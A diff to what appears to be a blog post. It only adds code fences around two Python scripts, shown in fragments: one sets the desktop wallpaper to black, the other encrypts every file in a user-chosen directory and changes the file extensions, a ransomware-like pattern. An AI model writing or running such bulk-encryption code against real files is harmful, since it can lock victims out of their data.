@@ -2,6 +2,7 @@
 layout: post
 ---
 
+``` 
 import subprocess
 
 def change_wallpaper_to_black():
@@ -16,10 +17,10 @@ def change_wallpaper_to_black():
 
 if __name__ == "__main__":
     change_wallpaper_to_black()
+```
 
 
-
-
+```
 import os
 
 def encrypt_file(file_path):
@@ -54,3 +55,5 @@ if __name__ == "__main__":
     directory_path = input("Enter the directory path to encrypt files: ")
     encrypt_directory(directory_path)
     print("Encryption and extension change complete!")
+    
+```
